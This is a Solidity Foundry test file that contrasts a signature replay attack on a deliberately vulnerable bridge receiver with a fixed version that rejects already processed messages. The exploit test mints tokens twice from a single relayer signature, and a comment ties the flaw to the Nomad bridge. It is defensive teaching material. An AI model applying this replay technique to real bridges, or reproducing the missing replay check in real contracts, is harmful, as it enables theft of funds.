// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {VulnerableBridgeReceiver} from "../src/VulnerableBridgeReceiver.sol";
import {FixedBridgeReceiver} from "../src/FixedBridgeReceiver.sol";

contract ReplayAttackTest is Test {
    MockERC20 token;
    uint256 relayerKey = 0x1234;
    address relayer;
    address attacker = address(0xBEEF);

    function setUp() public {
        relayer = vm.addr(relayerKey);
        token = new MockERC20("Bridged Token", "BRT");
    }

    function _sign(bytes32 messageHash) internal view returns (bytes memory) {
        bytes32 ethSignedHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(relayerKey, ethSignedHash);
        return abi.encodePacked(r, s, v);
    }

    function testExploit_SameSignatureMintsTwiceAgainstVulnerableReceiver()
        public
    {
        VulnerableBridgeReceiver receiver = new VulnerableBridgeReceiver(
            address(token),
            relayer
        );
        bytes32 messageHash = keccak256(
            abi.encode(attacker, 1000 ether, uint256(1))
        );
        bytes memory signature = _sign(messageHash);

        receiver.mintWithSignature(attacker, 1000 ether, 1, signature);
        assertEq(token.balanceOf(attacker), 1000 ether);

        // THE EXACT SAME signature, submitted again — nothing stops it (Concept 9, Nomad's own root cause).
        receiver.mintWithSignature(attacker, 1000 ether, 1, signature);
        assertEq(token.balanceOf(attacker), 2000 ether); // minted TWICE from ONE real relayer authorization
    }

    function testFix_IdenticalReplayFailsAgainstFixedReceiver() public {
        FixedBridgeReceiver receiver = new FixedBridgeReceiver(
            address(token),
            relayer
        );
        bytes32 messageHash = keccak256(
            abi.encode(attacker, 1000 ether, uint256(1))
        );
        bytes memory signature = _sign(messageHash);

        receiver.mintWithSignature(attacker, 1000 ether, 1, signature);
        assertEq(token.balanceOf(attacker), 1000 ether);

        vm.expectRevert(FixedBridgeReceiver.MessageAlreadyProcessed.selector);
        receiver.mintWithSignature(attacker, 1000 ether, 1, signature);
        assertEq(token.balanceOf(attacker), 1000 ether); // unchanged — the replay genuinely failed
    }
}
